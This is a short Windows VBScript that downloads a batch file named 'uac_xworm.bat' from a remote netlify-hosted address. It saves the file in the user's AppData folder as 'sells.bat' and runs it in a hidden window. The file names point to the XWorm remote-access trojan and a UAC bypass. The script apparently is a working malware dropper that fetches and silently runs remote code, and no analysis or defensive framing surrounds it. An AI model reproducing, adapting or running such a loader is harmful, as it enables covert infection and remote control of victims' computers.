Set objXML = CreateObject("Microsoft.XMLHTTP")
objXML.Open "GET", "https://web-arc.netlify.app/legion/uac_xworm.bat", False
objXML.Send

If objXML.Status = 200 Then
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    set WshShell = CreateObject("WScript.Shell")
    appData = WshShell.ExpandEnvironmentStrings("%appdata%")
    Set file = objFSO.CreateTextFile(appData & "\sells.bat", True)
    file.Write objXML.ResponseText
    file.Close

    ' Run the downloaded batch file hidden
    WshShell.Run """" & appData & "\sells.bat""", 0, False
End If
